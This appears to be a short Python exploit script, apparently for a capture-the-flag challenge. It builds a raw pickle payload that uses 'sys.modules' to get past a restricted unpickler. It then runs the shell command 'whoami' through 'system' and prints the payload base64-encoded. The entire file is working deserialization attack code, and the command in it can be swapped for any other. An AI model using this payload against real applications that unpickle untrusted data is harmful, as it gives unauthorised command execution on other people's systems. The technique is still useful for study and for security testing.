import base64

payload = b"csys\nmodules\np0\nS'sys'\ng0\nscsys\nget\np1\ng1\n(S'os'\ntRp2\ng0\nS'sys'\ng2\nscsys\nsystem\np3\ng3\n(S'whoami'\ntR."

exp = base64.b64encode(payload).decode()

print(exp)

